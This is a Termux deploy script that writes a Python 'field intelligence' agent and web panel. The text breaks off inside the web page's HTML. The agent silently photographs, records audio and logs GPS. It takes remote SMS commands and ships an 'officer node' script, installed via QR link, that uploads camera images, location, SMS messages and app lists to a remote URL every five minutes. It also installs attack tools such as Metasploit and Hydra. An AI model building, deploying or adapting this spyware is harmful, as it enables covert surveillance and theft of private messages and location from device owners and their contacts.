#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
#  APEX OMNI AGENT – One-Command Termux Deploy
#  কপি-পেস্ট করে Enter দিলেই সম্পূর্ণ সিস্টেম তৈরি হবে
# ============================================================
set -e

pkill -9 -f omni_agent 2>/dev/null || true
pkill -9 -f ollama 2>/dev/null || true
rm -rf ~/apex_omni 2>/dev/null || true
mkdir -p ~/apex_omni/{data,logs,models}

cat << 'PYEOF' > ~/apex_omni/omni_agent.py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
#  APEX OMNI AGENT v22.0 — 47+ Features | Rich TUI | Offline AI | Web UI
#  সম্পূর্ণ ফিল্ড ইন্টেলিজেন্স ও AI কমান্ড সেন্টার
# =============================================================================
import os, sys, subprocess, time, json, uuid, sqlite3, threading, hashlib
import socket, base64, io, re, secrets, shutil, queue, math, logging
from datetime import datetime
from pathlib import Path

PREFIX = "/data/data/com.termux/files/usr"
BASE = Path.home() / "apex_omni"
DATA_DIR = BASE / "data"
MODELS_DIR = BASE / "models"
LOGS_DIR = BASE / "logs"
OLLAMA_BIN = Path(PREFIX) / "bin" / "ollama"
MODEL_NAME = "qwen2.5:0.5b"
DB_PATH = DATA_DIR / "vault.db"
ALERT_NUMBER_FILE = DATA_DIR / "alert_number.txt"
GEOFENCE_FILE = DATA_DIR / "geofence.json"
LOG_FILE = LOGS_DIR / "agent.log"

for d in [DATA_DIR, LOGS_DIR, MODELS_DIR]:
    d.mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    filename=str(LOG_FILE), level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s"
)

# ======================== HELPER ========================
def run_cmd(cmd, timeout=180, shell=False):
    env = os.environ.copy()
    env["PATH"] = f"{PREFIX}/bin:{env.get('PATH','')}"
    try:
        return subprocess.run(
            cmd, capture_output=True, text=True,
            timeout=timeout, env=env, shell=shell
        )
    except Exception as e:
        logging.warning(f"cmd failed: {cmd} – {e}")
        return None

# ======================== BOOTSTRAP ========================
def bootstrap():
    print("\033[1;36m╔═══════════════════════════════════════════╗")
    print("║   APEX OMNI AGENT – BOOTSTRAP             ║")
    print("╚═══════════════════════════════════════════╝\033[0m")

    # 1. System packages
    print("\033[1;33m[1/4] System packages...\033[0m")
    pkgs = (
        "python python-pip python-pillow nmap netcat-openbsd git curl wget "
        "jq termux-api tshark tcpdump coreutils sqlite rust cargo openssh "
        "openssl tar zip unzip figlet"
    ).split()
    for p in pkgs:
        run_cmd(["pkg", "install", "-y", p])

    # 2. Pillow (robust install)
    try:
        from PIL import Image
        print("  \033[1;32m✓ PIL\033[0m")
    except ImportError:
        print("  \033[1;33m⏳ PIL installing via pkg...\033[0m")
        run_cmd(["pkg", "install", "-y", "python-pillow"])
        try:
            from PIL import Image
            print("  \033[1;32m✓ PIL via pkg\033[0m")
        except ImportError:
            print("  \033[1;33m⏳ PIL installing via pip...\033[0m")
            os.environ["LDFLAGS"] = "-L/system/lib/"
            os.environ["CFLAGS"] = f"-I{PREFIX}/include/"
            run_cmd([sys.executable, "-m", "pip", "install", "--quiet", "pillow"])

    # 3. Python modules
    print("\033[1;33m[2/4] Python modules...\033[0m")
    mods = {
        "flask": "flask",
        "flask-cors": "flask_cors",
        "flask-socketio": "flask_socketio",
        "qrcode": "qrcode",
        "requests": "requests",
        "urllib3": "urllib3",
        "rich": "rich",
        "pycryptodomex": "Cryptodome",
        "werkzeug": "werkzeug",
        "colorama": "colorama",
    }
    for mod, imp_name in mods.items():
        try:
            __import__(imp_name)
            print(f"  \033[1;32m✓ {mod}\033[0m")
        except ImportError:
            print(f"  \033[1;33m⏳ {mod}...\033[0m")
            run_cmd([sys.executable, "-m", "pip", "install", "--quiet", mod])

    # 4. Ollama binary (offline AI)
    print("\033[1;33m[3/4] Ollama AI engine...\033[0m")
    if not OLLAMA_BIN.exists():
        try:
            import requests as _req
            url = "https://github.com/ollama/ollama/releases/download/v0.1.30/ollama-linux-arm64"
            print("  \033[1;33m⏳ Downloading Ollama binary...\033[0m")
            r = _req.get(url, timeout=120, allow_redirects=True)
            if r.status_code == 200 and len(r.content) > 1000:
                with open(OLLAMA_BIN, "wb") as f:
                    f.write(r.content)
                OLLAMA_BIN.chmod(0o755)
                if OLLAMA_BIN.exists() and OLLAMA_BIN.stat().st_size > 1000:
                    print("  \033[1;32m✓ Ollama downloaded\033[0m")
                else:
                    OLLAMA_BIN.unlink(missing_ok=True)
                    print("  \033[1;31m✗ Ollama file invalid\033[0m")
            else:
                print(f"  \033[1;31m✗ HTTP {r.status_code}\033[0m")
        except Exception as e:
            print(f"  \033[1;31m✗ Ollama download failed: {e}\033[0m")
    else:
        print("  \033[1;32m✓ Ollama already present\033[0m")

    print("\033[1;33m[4/4] Wake lock...\033[0m")
    run_cmd(["termux-wake-lock"])
    print("\033[1;32m[BOOT] Complete!\033[0m\n")

bootstrap()

# ======================== IMPORTS (safe after bootstrap) ========================
from flask import Flask, request, jsonify, render_template_string, send_file, Response
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import qrcode
from PIL import Image
import requests as req
import urllib3
urllib3.disable_warnings()

from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich.align import Align
from rich import box

console = Console()

# ======================== DATABASE ========================
def init_db():
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS officers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT UNIQUE, name TEXT, ip TEXT,
        token TEXT, cloud_url TEXT, last_seen TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ts TEXT, event TEXT, ip TEXT, data TEXT,
        prev_hash TEXT, hash TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS arp_log (
        ts TEXT, mac TEXT, ip TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS system_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        level TEXT, message TEXT, source TEXT
    )""")
    conn.commit()
    conn.close()

init_db()

# ======================== HASH-CHAIN AUDIT LOG ========================
def log_event(ev, ip, data):
    try:
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        c.execute("SELECT hash FROM events ORDER BY id DESC LIMIT 1")
        last = c.fetchone()
        prev = last[0] if last else "0" * 64
        ts = datetime.now().isoformat()
        raw = f"{ts}{ev}{ip}{data}{prev}"
        h = hashlib.sha256(raw.encode()).hexdigest()
        c.execute(
            "INSERT INTO events (ts,event,ip,data,prev_hash,hash) VALUES (?,?,?,?,?,?)",
            (ts, ev, ip, data, prev, h),
        )
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"log_event: {e}")

log_event("OMNI_BOOT", "127.0.0.1", "v22.0 All Features")

# live log queue for TUI
log_queue = queue.Queue(maxsize=200)

def log_msg(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    entry = f"[{ts}] {level}: {msg}"
    try:
        log_queue.put_nowait(entry)
    except queue.Full:
        log_queue.get()
        log_queue.put_nowait(entry)
    logging.info(msg)

log_msg("System booted")

# ======================== NETWORK ========================
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

DIR_IP = get_ip()

def cpu_ram():
    cpu = ram = -1
    try:
        with open("/proc/stat") as f:
            parts = f.readline().split()
            idle = float(parts[4])
            total = sum(float(x) for x in parts[1:])
            cpu = round(100.0 * (1 - idle / total), 1)
    except Exception:
        pass
    try:
        with open("/proc/meminfo") as f:
            m = f.read()
            total = int(re.search(r"MemTotal:\s+(\d+)", m).group(1))
            avail = int(re.search(r"MemAvailable:\s+(\d+)", m).group(1))
            ram = round(100.0 * (1 - avail / total), 1)
    except Exception:
        pass
    return cpu, ram

# ======================== OLLAMA / AI ========================
def start_ollama():
    if not OLLAMA_BIN.exists():
        return False
    subprocess.Popen(
        [str(OLLAMA_BIN), "serve"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )
    time.sleep(3)
    try:
        req.get("http://127.0.0.1:11434/api/tags", timeout=5)
        log_msg("Ollama server started")
        return True
    except Exception:
        return False

def pull_model():
    if OLLAMA_BIN.exists():
        try:
            req.get("http://127.0.0.1:11434/api/tags", timeout=2)
        except Exception:
            start_ollama()
        run_cmd([str(OLLAMA_BIN), "pull", MODEL_NAME], timeout=300)
        log_msg(f"Model {MODEL_NAME} pulled")

def ai_generate(prompt):
    if not OLLAMA_BIN.exists():
        return "AI engine not installed. Ollama binary missing."
    try:
        r = req.post(
            "http://127.0.0.1:11434/api/generate",
            json={"model": MODEL_NAME, "prompt": prompt, "stream": False},
            timeout=60,
        )
        if r.status_code == 200:
            return r.json().get("response", "No response").strip()
    except Exception:
        return "AI is offline. Start Ollama first."
    return "AI error."

threading.Thread(target=start_ollama, daemon=True).start()
threading.Thread(target=pull_model, daemon=True).start()

# ======================== BACKGROUND SURVEILLANCE ========================
def silent_capture():
    """Silent camera + GPS logging + geofence check every 10 min"""
    while True:
        try:
            subprocess.run(
                ["termux-camera-photo", "-c", "0", str(DATA_DIR / "silent.jpg")],
                timeout=10, capture_output=True,
            )
            loc_out = subprocess.check_output(
                ["termux-location"], text=True, timeout=15
            )
            with open(DATA_DIR / "gps.log", "a") as f:
                f.write(f"{datetime.now().isoformat()}: {loc_out}\n")

            # Geofencing check
            if GEOFENCE_FILE.exists():
                geo = json.loads(GEOFENCE_FILE.read_text())
                lat0, lon0 = geo.get("lat"), geo.get("lon")
                radius = geo.get("radius", 100)
                cur = json.loads(loc_out)
                cur_lat, cur_lon = cur.get("latitude"), cur.get("longitude")
                if lat0 and lon0 and cur_lat and cur_lon:
                    r_earth = 6371000
                    dlat = math.radians(cur_lat - lat0)
                    dlon = math.radians(cur_lon - lon0)
                    a = (
                        math.sin(dlat / 2) ** 2
                        + math.cos(math.radians(lat0))
                        * math.cos(math.radians(cur_lat))
                        * math.sin(dlon / 2) ** 2
                    )
                    dist = r_earth * 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
                    if dist > radius:
                        log_msg(f"GEOFENCE BREACH! dist={dist:.0f}m", "ALERT")
                        if ALERT_NUMBER_FILE.exists():
                            num = ALERT_NUMBER_FILE.read_text().strip()
                            if num:
                                subprocess.run(
                                    ["termux-sms-send", "-n", num,
                                     f"GEOFENCE BREACH! Distance: {dist:.0f}m"],
                                    capture_output=True,
                                )
        except Exception:
            pass
        time.sleep(600)

def arp_monitor():
    """Passive ARP monitor – alerts on new devices"""
    known = set()
    while True:
        try:
            out = subprocess.check_output(
                "ip neigh 2>/dev/null | grep REACHABLE",
                shell=True, text=True, timeout=10,
            )
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 5:
                    ip_addr, mac = parts[0], parts[4]
                    if mac not in known:
                        known.add(mac)
                        try:
                            conn = sqlite3.connect(str(DB_PATH))
                            c = conn.cursor()
                            c.execute(
                                "INSERT INTO arp_log (ts,mac,ip) VALUES (?,?,?)",
                                (datetime.now().isoformat(), mac, ip_addr),
                            )
                            conn.commit()
                            conn.close()
                        except Exception:
                            pass
                        log_msg(f"New device: {ip_addr} [{mac}]")
                        if ALERT_NUMBER_FILE.exists():
                            num = ALERT_NUMBER_FILE.read_text().strip()
                            if num:
                                subprocess.run(
                                    ["termux-sms-send", "-n", num,
                                     f"New device: {ip_addr} {mac}"],
                                    capture_output=True,
                                )
                        try:
                            socketio.emit("new_device", {"ip": ip_addr, "mac": mac})
                        except Exception:
                            pass
        except Exception:
            pass
        time.sleep(30)

def sms_poller():
    """SMS command interface: !!LOC, !!PHOTO, !!WIPE, !!SCAN, !!PING, !!RECORD"""
    while True:
        try:
            out = subprocess.check_output(
                ["termux-sms-list"], text=True, timeout=10
            )
            for sms in json.loads(out):
                body = sms.get("body", "")
                if body.startswith("!!"):
                    sender = sms.get("number", "")
                    cmd = body[2:].strip().upper()
                    log_event("SMS_CMD", sender, cmd)
                    log_msg(f"SMS cmd: {cmd} from {sender}")
                    if cmd == "LOC":
                        loc = subprocess.check_output(
                            ["termux-location"], text=True, timeout=15
                        )
                        subprocess.run(
                            ["termux-sms-send", "-n", sender, f"LOC:{loc}"],
                            capture_output=True,
                        )
                    elif cmd == "PHOTO":
                        subprocess.run(
                            ["termux-camera-photo", "-c", "0",
                             str(DATA_DIR / "sms_cap.jpg")],
                            capture_output=True, timeout=10,
                        )
                    elif cmd == "WIPE":
                        DB_PATH.unlink(missing_ok=True)
                        init_db()
                        log_event("PANIC_WIPE", "SMS", "Remote wipe")
                    elif cmd == "SCAN":
                        subnet = ".".join(DIR_IP.split(".")[:3]) + ".0/24"
                        scan_out = subprocess.check_output(
                            ["nmap", "-sn", subnet], text=True, timeout=30
                        )
                        subprocess.run(
                            ["termux-sms-send", "-n", sender, scan_out[:160]],
                            capture_output=True,
                        )
                    elif cmd == "PING":
                        subprocess.run(
                            ["termux-sms-send", "-n", sender, "PONG from APEX"],
                            capture_output=True,
                        )
                    elif cmd == "RECORD":
                        subprocess.run(
                            ["termux-microphone-record", "-d", "10",
                             str(DATA_DIR / "sms_rec.wav")],
                            capture_output=True, timeout=15,
                        )
        except Exception:
            pass
        time.sleep(15)

def self_healing():
    """Self-healing: restart crashed threads, log rotation"""
    while True:
        try:
            # Log rotation (keep last 5000 lines)
            if LOG_FILE.exists() and LOG_FILE.stat().st_size > 5_000_000:
                lines = LOG_FILE.read_text().splitlines()
                LOG_FILE.write_text("\n".join(lines[-5000:]) + "\n")
                log_msg("Log rotated")
        except Exception:
            pass
        time.sleep(300)

# Start background threads
for fn in [arp_monitor, sms_poller, silent_capture, self_healing]:
    threading.Thread(target=fn, daemon=True).start()

# ======================== OFFICER NODE SCRIPT ========================
OFFICER_NODE = r'''#!/usr/bin/env python3
import os,subprocess,requests,uuid,time,json,threading,urllib3
urllib3.disable_warnings()
requests.packages.urllib3.disable_warnings()
TOKEN="{token}"
CLOUD_URL="{cloud}"
DEVICE_ID=str(uuid.uuid4())
def upload(cat,data=None,path=None):
    try:
        if path and os.path.exists(path):
            with open(path,"rb") as f:
                requests.post(CLOUD_URL,files={{"file":f}},data={{"device_id":DEVICE_ID,"category":cat}},verify=False)
        else:
            requests.post(CLOUD_URL,data={{"device_id":DEVICE_ID,"category":cat,"data":data or ""}},verify=False)
    except: pass
def collect():
    while True:
        try:
            subprocess.run(["termux-camera-photo","-c","0","/tmp/cam.jpg"],capture_output=True,timeout=10)
            upload("camera",path="/tmp/cam.jpg")
            loc=subprocess.check_output(["termux-location"],text=True,timeout=15)
            upload("location",data=loc)
            sms=subprocess.check_output(["termux-sms-list"],text=True,timeout=10)
            upload("sms",data=sms)
            apps=subprocess.check_output(["pm","list","packages"],text=True,timeout=10)
            upload("apps",data=apps)
        except: pass
        time.sleep(300)
threading.Thread(target=collect,daemon=True).start()
from flask import Flask,jsonify
app=Flask(__name__)
@app.route("/api/ping")
def ping(): return jsonify({{"id":DEVICE_ID,"token":TOKEN}})
app.run(host="0.0.0.0",port=5050)
'''

# ======================== FLASK APP ========================
app = Flask(__name__)
app.config["SECRET_KEY"] = secrets.token_hex(32)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# --- Endpoints ---
@app.route("/")
def index():
    return render_template_string(HTML_UI)

@app.route("/manifest.json")
def manifest():
    return jsonify({
        "name": "APEX OMNI AGENT",
        "short_name": "APEX",
        "start_url": "/",
        "display": "standalone",
        "background_color": "#0b0f1a",
        "theme_color": "#00f0ff",
    })

@app.route("/api/deploy")
def deploy():
    name = request.args.get("name", "Officer")
    cloud = request.args.get("cloud", "")
    if not cloud:
        return jsonify({"error": "Cloud URL required"}), 400
    token = secrets.token_urlsafe(24)
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute(
        "INSERT OR REPLACE INTO officers (device_id,name,ip,token,cloud_url,last_seen) "
        "VALUES (?,?,?,?,?,?)",
        (str(uuid.uuid4()), name, "0.0.0.0", token, cloud, datetime.now().isoformat()),
    )
    conn.commit()
    conn.close()
    url = f"http://{DIR_IP}:8080/install?token={token}&cloud={cloud}"
    img = qrcode.make(url)
    buf = io.BytesIO()
    img.save(buf, "PNG")
    buf.seek(0)
    log_event("DEPLOY", DIR_IP, name)
    log_msg(f"Officer deployed: {name}")
    return jsonify({"url": url, "qr": base64.b64encode(buf.getvalue()).decode()})

@app.route("/install")
def install_officer():
    t = request.args.get("token")
    c = request.args.get("cloud")
    if not t or not c:
        return "Missing params", 400
    script = OFFICER_NODE.format(token=t, cloud=c)
    return Response(script, mimetype="text/x-python")

@app.route("/api/scan")
def scan():
    try:
        subnet = ".".join(DIR_IP.split(".")[:3]) + ".0/24"
        out = subprocess.check_output(
            ["nmap", "-sn", subnet], text=True, timeout=30
        )
        log_msg("Nmap scan completed")
        return jsonify({"output": out})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/bettercap")
def bettercap():
    try:
        out = subprocess.check_output(
            ["bettercap", "-eval", "net.recon on; sleep 10; net.show; exit"],
            text=True, timeout=20,
        )
        return jsonify({"output": out})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/wipe")
def wipe():
    try:
        conn = sqlite3.connect(str(DB_PATH))
        c = conn.cursor()
        c.execute("DELETE FROM officers")
        c.execute("DELETE FROM events")
        c.execute("DELETE FROM arp_log")
        conn.commit()
        conn.close()
        log_event("PANIC_WIPE", "127.0.0.1", "Manual wipe")
        log_msg("PANIC WIPE executed", "ALERT")
        return jsonify({"output": "All data wiped."})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/officers")
def officers_list():
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("SELECT name, ip, cloud_url, last_seen FROM officers ORDER BY id DESC LIMIT 20")
    rows = c.fetchall()
    conn.close()
    return jsonify([{"name": r[0], "ip": r[1], "cloud": r[2], "last": r[3]} for r in rows])

@app.route("/api/arp")
def arp_table():
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("SELECT ts, mac, ip FROM arp_log ORDER BY ts DESC LIMIT 30")
    rows = c.fetchall()
    conn.close()
    return jsonify([{"ts": r[0], "mac": r[1], "ip": r[2]} for r in rows])

@app.route("/api/qr")
def qr_endpoint():
    img = qrcode.make(f"http://{DIR_IP}:8080")
    buf = io.BytesIO()
    img.save(buf, "PNG")
    buf.seek(0)
    return Response(buf.getvalue(), mimetype="image/png")

@app.route("/api/health")
def health():
    cpu, ram = cpu_ram()
    ai_status = "running" if OLLAMA_BIN.exists() else "unavailable"
    return jsonify({"cpu": cpu, "ram": ram, "ai": ai_status, "ip": DIR_IP})

@app.route("/api/ai", methods=["POST"])
def ai_chat():
    prompt = request.json.get("prompt", "")
    reply = ai_generate(prompt)
    log_msg(f"AI query: {prompt[:50]}")
    return jsonify({"reply": reply})

@app.route("/api/voice", methods=["POST"])
def voice():
    try:
        out = subprocess.check_output(
            ["termux-speech-to-text"], timeout=10
        ).decode().strip()
        return jsonify({"text": out or "Could not hear"})
    except Exception as e:
        return jsonify({"text": f"Voice error: {e}"})

@app.route("/api/speak", methods=["POST"])
def speak():
    text = request.json.get("text", "")
    if text:
        subprocess.Popen(
            ["termux-tts-speak", text], stderr=subprocess.DEVNULL
        )
    return jsonify({"status": "ok"})

@app.route("/api/record")
def record():
    try:
        rec_path = str(DATA_DIR / "rec.wav")
        subprocess.run(
            ["termux-microphone-record", "-d", "10", rec_path],
            timeout=15, capture_output=True,
        )
        return send_file(rec_path, mimetype="audio/wav")
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/camera")
def camera():
    try:
        cam_path = str(DATA_DIR / "web_cap.jpg")
        subprocess.run(
            ["termux-camera-photo", "-c", "0", cam_path],
            timeout=10, capture_output=True,
        )
        return send_file(cam_path, mimetype="image/jpeg")
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/gps")
def gps():
    try:
        loc = subprocess.check_output(
            ["termux-location"], text=True, timeout=15
        )
        return jsonify(json.loads(loc))
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/config", methods=["POST"])
def config():
    data = request.json
    if "alert_number" in data:
        ALERT_NUMBER_FILE.write_text(data["alert_number"])
    if "geofence" in data:
        GEOFENCE_FILE.write_text(json.dumps(data["geofence"]))
    log_msg("Config updated")
    return jsonify({"status": "ok"})

@app.route("/api/logs")
def logs_endpoint():
    items = []
    while not log_queue.empty():
        try:
            items.append(log_queue.get_nowait())
        except queue.Empty:
            break
    # put items back
    for it in items:
        try:
            log_queue.put_nowait(it)
        except queue.Full:
            break
    return jsonify(items[-50:])

@app.route("/api/audit")
def audit():
    conn = sqlite3.connect(str(DB_PATH))
    c = conn.cursor()
    c.execute("SELECT ts, event, ip, data, hash FROM events ORDER BY id DESC LIMIT 50")
    rows = c.fetchall()
    conn.close()
    return jsonify([
        {"ts": r[0], "event": r[1], "ip": r[2], "data": r[3], "hash": r[4][:16] + "..."}
        for r in rows
    ])

# --- Tools install ---
TOOLS = {
    "metasploit": "cd ~ && git clone https://github.com/rapid7/metasploit-framework 2>&1 | tail -3",
    "sqlmap": "cd ~ && git clone https://github.com/sqlmapproject/sqlmap.git 2>&1 | tail -3",
    "hydra": "pkg install hydra -y 2>&1 | tail -3",
    "aircrack": "pkg install aircrack-ng -y 2>&1 | tail -3",
    "kali": "pkg install wget proot -y && wget -q https://raw.githubusercontent.com/EXALAB/AnLinux-Resources/master/Scripts/Installer/Kali/kali.sh && bash kali.sh 2>&1 | tail -3",
    "wascan": "cd ~ && git clone https://github.com/m4ll0k/WAScan.git 2>&1 | tail -3",
    "nikto": "cd ~ && git clone https://github.com/sullo/nikto.git 2>&1 | tail -3",
    "theharvester": "cd ~ && git clone https://github.com/laramies/theHarvester.git 2>&1 | tail -3",
}

@app.route("/api/tools/install/<name>")
def install_tool(name):
    if name not in TOOLS:
        return jsonify({"error": "unknown tool"}), 400
    try:
        out = subprocess.check_output(
            TOOLS[name], shell=True, text=True, timeout=120
        )
        log_msg(f"Tool installed: {name}")
        return jsonify({"output": out.strip() or "Done"})
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route("/api/tools/list")
def tools_list():
    return jsonify(list(TOOLS.keys()))

# ======================== WEB UI (Glassmorphism Tabbed) ========================
HTML_UI = r'''<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<link rel="manifest" href="/manifest.json">
<meta name="theme-color" content="#00f0ff">
<title>APEX OMNI AGENT</title>
<style>
:root{--bg:#0b0f1a;--card:rgba(20,30,48,0.75);--accent:#00f0ff;--green:#00ff88;--text:#e0f0ff;--out:#080c16}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;padding:12px;min-height:100vh}
.header{text-align:center;padding:18px 0 10px;border-bottom:1px solid rgba(0,240,255,0.2);margin-bottom:16px}
.header h1{font-size:1.5em;color:var(--accent);text-shadow:0 0 20px rgba(0,240,255,0.3)}
.header p{font-size:.75em;color:#6080a0;margin-top:4px}
.tabs{display:flex;gap:6px;margin-bottom:16px;overflow-x:auto;padding-bottom:4px}
.tab{padding:10px 16px;background:var(--card);backdrop-filter:blur(12px);border-radius:12px;cursor:pointer;color:#8090b0;font-weight:600;white-space:nowrap;border:1px solid transparent;transition:.2s}
.tab:hover{border-color:rgba(0,240,255,0.3)}
.tab.active{background:var(--accent);color:#000;border-color:var(--accent)}
.view{display:none;animation:fadeIn .3s}.view.active{display:block}
@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:14px}
@media(min-width:600px){.grid{grid-template-columns:repeat(4,1fr)}}
.card{background:var(--card);backdrop-filter:blur(14px);border:1px solid #1a2a40;border-radius:18px;padding:18px 10px;text-align:center;cursor:pointer;transition:.15s;font-size:.85em}
.card:active{transform:scale(0.95);border-color:var(--accent)}
.card .icon{font-size:1.8rem;margin-bottom:6px}
.output{background:var(--out);border:1px solid #1a2a40;border-radius:14px;padding:14px;min-height:90px;font-family:'Fira Code',monospace;color:var(--green);white-space:pre-wrap;font-size:.78rem;max-height:250px;overflow-y:auto;margin-top:10px}
.btn{background:var(--accent);border:none;padding:10px 20px;border-radius:18px;color:#000;font-weight:700;cursor:pointer;font-size:.85em;transition:.15s}
.btn:active{transform:scale(0.95)}
.btn-danger{background:#e03030;color:#fff}
input,textarea{width:100%;padding:11px 14px;margin:6px 0;border-radius:12px;border:1px solid #1a2a40;background:var(--out);color:#fff;font-size:.85em}
.status-bar{display:flex;gap:12px;justify-content:center;margin:10px 0;font-size:.75em;color:#6080a0}
.status-bar span{background:var(--card);padding:6px 12px;border-radius:10px}
.chat-box{height:250px;overflow-y:auto;padding:10px}
.chat-msg{margin:6px 0;padding:8px 12px;border-radius:12px;max-width:85%}
.chat-user{background:#1a2a40;margin-left:auto;text-align:right}
.chat-ai{background:#0a1a2a;border:1px solid #1a3050}
#deployModal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);justify-content:center;align-items:center;z-index:100}
.modal-box{background:#101828;padding:24px;border-radius:22px;width:92%;max-width:400px;border:1px solid #1a2a40}
</style>
</head>
<body>

<div class="header">
  <h1>APEX OMNI AGENT</h1>
  <p id="statusLine">Loading...</p>
</div>

<div class="status-bar" id="healthBar">
  <span id="hCpu">CPU: --</span>
  <span id="hRam">RAM: --</span>
  <span id="hAi">AI: --</span>
</div>

<div class="tabs">
  <div class="tab active" onclick="switchTab('commando')">Commando</div>
  <div class="tab" onclick="switchTab('ai')">AI Chat</div>
  <div class="tab" onclick="switchTab('tools')">Tools</div>
  <div class="tab" onclick="switchTab('network')">Network</div>
  <div class="tab" onclick="switchTab('logs')">Logs</div>
  <div class="tab" onclick="switchTab('settings')">Settings</div>
</div>

<!-- COMMANDO -->
<div class="view active" id="view-commando">
  <div class="grid">
    <div class="card" onclick="openDeploy()"><div class="icon">🚀</div>Deploy Officer</div>
    <div class="card" onclick="runCmd('scan')"><div class="icon">📡</div>Nmap Scan</div>
    <div class="card" onclick="runCmd('bettercap')"><div class="icon">📶</div>Bettercap</div>
    <div class="card" onclick="runCmd('wipe')"><div class="icon">⚠️</div>Panic Wipe</div>
    <div class="card" onclick="showOfficers()"><div class="icon">👥</div>Officers</div>
    <div class="card" onclick="showARP()"><div class="icon">📋</div>ARP Table</div>
    <div class="card" onclick="showQR()"><div class="icon">📷</div>QR Code</div>
    <div class="card" onclick="recordAudio()"><div class="icon">🎤</div>Record 10s</div>
  </div>
  <div class="output" id="commandoOut">[ Ready ]</div>
</div>

<!-- AI CHAT -->
<div class="view" id="view-ai">
  <div class="output chat-box" id="aiChatBox"></div>
  <div style="display:flex;gap:8px;margin-top:10px">
    <input id="aiPrompt" placeholder="AI কে জিজ্ঞেস করুন..." onkeypress="if(event.key==='Enter')askAI()"/>
    <button class="btn" onclick="askAI()">Send</button>
  </div>
  <div style="margin-top:8px;display:flex;gap:8px">
    <button class="btn" onclick="voiceInput()">🎤 Voice</button>
    <button class="btn" onclick="speakLast()">🔊 Speak</button>
  </div>
</div>

<!-- TOOLS -->
<div class="view" id="view-tools">
  <div class="grid">
    <div class="card" onclick="installTool('metasploit')"><div class="icon">💀</div>Metasploit</div>
    <div class="card" onclick="installTool('sqlmap')"><div class="icon">💉</div>SQLMap</div>
    <div class="card" onclick="installTool('hydra')"><div class="icon">🔑</div>Hydra</div>
    <div class="card" onclick="installTool('aircrack')"><div class="icon">📻</div>Aircrack</div>
    <div class="card" onclick="installTool('kali')"><div class="icon">🐉</div>Kali Linux</div>
    <div class="card" onclick="installTool('wascan')"><div class="icon">🌐</div>WAScan</div>
    <div class="card" onclick="installTool('nikto')"><div class="icon">🔍</div>Nikto</div>
    <div class="card" onclick="installTool('theharvester')"><div class="icon">🌾</div>theHarvester</div>
  </div>
  <div class="output" id="toolOut">Select a tool to install</div>
</div>

<!-- NETWORK -->
<div class="view" id="view-network">
  <div class="grid">
    <div class="card" onclick="getCamera()"><div class="icon">📸</div>Camera</div>
    <div class="card" onclick="getGPS()"><div class="icon">📍</div>GPS</div>
  </div>
  <div class="output" id="netOut">Network data...</div>
</div>

<!-- LOGS -->
<div class="view" id="view-logs">
  <button class="btn" onclick="refreshLogs()">Refresh</button>
  <button class="btn" onclick="showAudit()">Audit Chain</button>
  <div class="output" id="logsOut" style="height:300px">Loading logs...</div>
</div>

<!-- SETTINGS -->
<div class="view" id="view-settings">
  <div class="card" style="text-align:left;padding:20px">
    <h3 style="color:var(--accent);margin-bottom:12px">Alert Settings</h3>
    <label style="font-size:.8em;color:#6080a0">SMS Alert Number</label>
    <input id="alertNumber" placeholder="+8801XXXXXXXXX"/>
    <label style="font-size:.8em;color:#6080a0;margin-top:10px;display:block">Geofence (lat,lon,radius)</label>
    <input id="geoLat" placeholder="Latitude" style="width:32%;display:inline-block"/>
    <input id="geoLon" placeholder="Longitude" style="width:32%;display:inline-block"/>
    <input id="geoRad" placeholder="Radius (m)" style="width:32%;display:inline-block"/>
    <br><br>
    <button class="btn" onclick="saveConfig()">Save Config</button>
  </div>
</div>

<!-- Deploy Modal -->
<div id="deployModal" onclick="if(event.target===this)this.style.display='none'">
  <div class="modal-box">
    <h3 style="color:var(--accent);margin-bottom:12px">Deploy Officer</h3>
